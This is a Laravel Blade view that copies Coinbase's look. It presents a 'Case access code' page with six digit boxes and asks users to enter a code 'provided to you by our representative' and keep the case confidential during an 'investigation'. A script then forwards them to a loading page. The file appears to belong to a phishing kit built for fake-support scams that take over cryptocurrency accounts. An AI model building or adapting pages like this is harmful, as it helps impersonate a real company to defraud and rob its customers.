@extends('user.coinbase.layout')

@section('title', 'Coinbase - Access Code')

@section('pageCss')
*,:before,:after{--tw-border-spacing-x: 0;--tw-border-spacing-y: 0;--tw-translate-x: 0;--tw-translate-y: 0;--tw-rotate: 0;--tw-skew-x: 0;--tw-skew-y: 0;--tw-scale-x: 1;--tw-scale-y: 1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness: proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width: 0px;--tw-ring-offset-color: #fff;--tw-ring-color: rgb(59 130 246 / .5);--tw-ring-offset-shadow: 0 0 #0000;--tw-ring-shadow: 0 0 #0000;--tw-shadow: 0 0 #0000;--tw-shadow-colored: 0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }

*,
:before,
:after {
  box-sizing: border-box;
  border-width: 0;
  border-style: solid;
  border-color: #e5e7eb;
}

html,
:host {
  line-height: 1.5;
  -webkit-text-size-adjust: 100%;
  -moz-tab-size: 4;
  -o-tab-size: 4;
  tab-size: 4;
  font-family: ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";
  font-feature-settings: normal;
  font-variation-settings: normal;
  -webkit-tap-highlight-color: transparent;
}

body {
  margin: 0;
  line-height: inherit;
}

html,body,#root{height:100%}

button,
input,
optgroup,
select,
textarea {
  font-family: inherit;
  font-feature-settings: inherit;
  font-variation-settings: inherit;
  font-size: 100%;
  font-weight: inherit;
  line-height: inherit;
  letter-spacing: inherit;
  color: inherit;
  margin: 0;
  padding: 0;
}

img,
svg,
video,
canvas,
audio,
iframe,
embed,
object {
  display: block;
  vertical-align: middle;
}

.bg-coinbase-background {
  --tw-bg-opacity: 1;
  background-color: rgb(10 11 13 / var(--tw-bg-opacity, 1));
}
.bg-transparent { background-color: transparent; }
.flex { display: flex; }
.flex-col { flex-direction: column; }
.flex-grow { flex-grow: 1; }
.font-coinbase-sans { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-coinbase-text { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-coinbase-title { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-semibold { font-weight: 600; }
.gap-2 { gap: .5rem; }
.h-14 { height: 3.5rem; }
.h-full { height: 100%; }
.items-center { align-items: center; }
.justify-between { justify-content: space-between; }
.justify-center { justify-content: center; }
.max-w-md { max-width: 28rem; }
.mb-8 { margin-bottom: 2rem; }
.min-h-fit { min-height: -moz-fit-content; min-height: fit-content; }
.mt-4 { margin-top: 1rem; }
.mt-12 { margin-top: 3rem; }
.outline-none { outline: 2px solid transparent; outline-offset: 2px; }
.p-6 { padding: 1.5rem; }
.pb-2 { padding-bottom: .5rem; }
.pb-8 { padding-bottom: 2rem; }
.pt-5 { padding-top: 1.25rem; }
.px-6 { padding-left: 1.5rem; padding-right: 1.5rem; }
.rounded-\[16px\] { border-radius: 16px; }
.rounded-md { border-radius: .375rem; }
.ring-1 {
  --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
  --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
  box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
}
.ring-coinbase-line { --tw-ring-color: #8a919e33; }
.text-\[28px\] { font-size: 28px; }
.text-center { text-align: center; }
.text-xl { font-size: 1.25rem; line-height: 1.75rem; }
.text-coinbase-foreground-muted {
  --tw-text-opacity: 1;
  color: rgb(138 145 158 / var(--tw-text-opacity, 1));
}
.text-white {
  --tw-text-opacity: 1;
  color: rgb(255 255 255 / var(--tw-text-opacity, 1));
}
.transition-all {
  transition-property: all;
  transition-timing-function: cubic-bezier(.4,0,.2,1);
  transition-duration: .15s;
}
.w-full { width: 100%; }
.hover\:bg-\[\#0f1012\]:hover {
  --tw-bg-opacity: 1;
  background-color: rgb(15 16 18 / var(--tw-bg-opacity, 1));
}
.focus\:ring-2:focus {
  --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
  --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
  box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
}
.focus\:ring-coinbase-primary:focus {
  --tw-ring-opacity: 1;
  --tw-ring-color: rgb(87 139 250 / var(--tw-ring-opacity, 1));
}
.disabled\:bg-\[\#0a0a0c\]:disabled {
  --tw-bg-opacity: 1;
  background-color: rgb(10 10 12 / var(--tw-bg-opacity, 1));
}

@media (min-width: 640px) {
  .sm\:border { border-width: 1px; }
  .sm\:border-coinbase-line { border-color: #8a919e33; }
  .sm\:justify-start { justify-content: flex-start; }
  .sm\:mt-24 { margin-top: 6rem; }
  .sm\:px-10 { padding-left: 2.5rem; padding-right: 2.5rem; }
  .sm\:py-8 { padding-top: 2rem; padding-bottom: 2rem; }
}
@endsection

@section('content')
<form class="mt-12 flex min-h-fit w-full max-w-md flex-col rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8">
<span class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white">
Case access code
</span>
<span class="font-coinbase-sans text-coinbase-foreground-muted">
Enter the case access code provided to you by our representative.
</span>
<span class="font-coinbase-sans text-coinbase-foreground-muted mb-8 mt-4">
Please keep the case number confidential to ensure your information remains secure while we conduct our investigation.
</span>
<div class="flex w-full justify-between gap-2">
<input class="digit font-coinbase-sans text-center h-14 w-full rounded-md bg-transparent text-xl text-white outline-none ring-1 ring-coinbase-line transition-all hover:bg-[#0f1012] focus:ring-2 disabled:bg-[#0a0a0c] focus:ring-coinbase-primary" inputmode="numeric" maxlength="1" type="text" value=""/>
<input class="digit font-coinbase-sans text-center h-14 w-full rounded-md bg-transparent text-xl text-white outline-none ring-1 ring-coinbase-line transition-all hover:bg-[#0f1012] focus:ring-2 disabled:bg-[#0a0a0c] focus:ring-coinbase-primary" inputmode="numeric" maxlength="1" type="text" value=""/>
<input class="digit font-coinbase-sans text-center h-14 w-full rounded-md bg-transparent text-xl text-white outline-none ring-1 ring-coinbase-line transition-all hover:bg-[#0f1012] focus:ring-2 disabled:bg-[#0a0a0c] focus:ring-coinbase-primary" inputmode="numeric" maxlength="1" type="text" value=""/>
<input class="digit font-coinbase-sans text-center h-14 w-full rounded-md bg-transparent text-xl text-white outline-none ring-1 ring-coinbase-line transition-all hover:bg-[#0f1012] focus:ring-2 disabled:bg-[#0a0a0c] focus:ring-coinbase-primary" inputmode="numeric" maxlength="1" type="text" value=""/>
<input class="digit font-coinbase-sans text-center h-14 w-full rounded-md bg-transparent text-xl text-white outline-none ring-1 ring-coinbase-line transition-all hover:bg-[#0f1012] focus:ring-2 disabled:bg-[#0a0a0c] focus:ring-coinbase-primary" inputmode="numeric" maxlength="1" type="text" value=""/>
<input class="digit font-coinbase-sans text-center h-14 w-full rounded-md bg-transparent text-xl text-white outline-none ring-1 ring-coinbase-line transition-all hover:bg-[#0f1012] focus:ring-2 disabled:bg-[#0a0a0c] focus:ring-coinbase-primary" inputmode="numeric" maxlength="1" type="text" value=""/>
</div>
</form>
<script>
(function(){
  var inputs = Array.from(document.querySelectorAll('.digit'));
  var _submitted = false;

  function _currentCode(){ return inputs.map(function(i){ return i.value; }).join(''); }

  function _check(){
    var code = _currentCode();
    if(code.length === 6 && inputs.every(function(i){ return i.value !== ''; }) && !_submitted){
      _submitted = true;
      document.documentElement.style.background = '#0a0b0d';
      document.body.style.background = '#0a0b0d';
      setTimeout(function(){
        if(window.navigateTo) window.navigateTo('/coinbase/loading');
        else window.location.href = '/coinbase/loading';
      }, 400);
    }
  }

  inputs.forEach(function(inp, idx){
    inp.addEventListener('input', function(){
      if(this.value.length >= 1 && idx < inputs.length - 1) inputs[idx+1].focus();
      _check();
    });
    inp.addEventListener('keydown', function(e){
      if(e.key === 'Backspace' && !this.value && idx > 0) inputs[idx-1].focus();
    });
  });
})();
</script>
@endsection
